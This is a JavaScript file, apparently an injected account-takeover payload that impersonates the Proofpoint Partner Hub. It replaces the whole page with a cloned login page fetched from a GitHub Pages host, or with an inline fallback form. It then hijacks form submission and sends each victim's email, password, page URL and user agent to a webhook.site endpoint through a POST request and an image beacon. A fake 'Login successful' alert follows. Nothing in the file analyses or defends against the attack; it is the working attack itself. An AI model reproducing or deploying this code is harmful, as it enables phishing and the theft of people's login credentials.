// ATO Script - Proofpoint Partner Hub
// Completely replaces the page with your Proofpoint clone

(function() {
    'use strict';
    
    // ============================================
    // YOUR WEBHOOK URL - REPLACE WITH YOURS
    // ============================================
    const WEBHOOK_URL = "https://webhook.site/79df073f-6dcb-46ef-a182-5df8600c0cef";
    // ============================================
    
    console.log('[+] ATO Payload Loaded - Replacing page with Proofpoint clone');
    
    // Fetch your index.html content
    fetch('https://swathip888a.github.io/ATO/index.html')
        .then(response => response.text())
        .then(html => {
            // COMPLETELY REPLACE the entire page content
            document.open();
            document.write(html);
            document.close();
            
            console.log('[+] Page replaced with Proofpoint login clone');
            
            // After page is replaced, inject credential capture
            setTimeout(() => {
                captureCredentials();
            }, 500);
        })
        .catch(err => {
            console.error('Failed to load index.html:', err);
            // Fallback: Show a simple login page
            document.open();
            document.write(`
                <!DOCTYPE html>
                <html>
                <head><title>Proofpoint Partner Hub</title>
                <style>
                    body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
                    .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 350px; }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                    button { width: 100%; padding: 10px; background: #035BFB; color: white; border: none; border-radius: 5px; cursor: pointer; }
                </style>
                </head>
                <body>
                <div class="login-box">
                    <h2>Proofpoint Partner Hub</h2>
                    <form id="loginForm">
                        <input type="email" id="email" placeholder="Email Address" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit">Sign In</button>
                    </form>
                </div>
                </body>
                </html>
            `);
            document.close();
            setTimeout(() => {
                captureCredentialsFallback();
            }, 500);
        });
    
    function captureCredentials() {
        // Find login form in the new page
        const emailField = document.querySelector('input[type="email"], input[name*="email" i], input[id*="email" i]');
        const passField = document.querySelector('input[type="password"]');
        const loginForm = document.querySelector('form');
        
        if (!loginForm) {
            console.log('[!] No login form found');
            return;
        }
        
        console.log('[+] Login form found, attaching interceptor');
        
        // Intercept form submission
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailField ? emailField.value : '';
            const password = passField ? passField.value : '';
            
            // Send to webhook
            const payload = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                email: email,
                password: password,
                userAgent: navigator.userAgent,
                source: "Proofpoint ATO Attack"
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
            
            new Image().src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
            
            console.log('[+] Credentials sent to webhook');
            alert('✓ Login successful! Redirecting...');
        });
    }
    
    function captureCredentialsFallback() {
        const form = document.querySelector('form');
        if (form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const email = document.getElementById('email')?.value || '';
                const password = document.getElementById('password')?.value || '';
                
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
                }).catch(() => {});
                
                alert('✓ Login successful!');
            });
        }
    }
})();
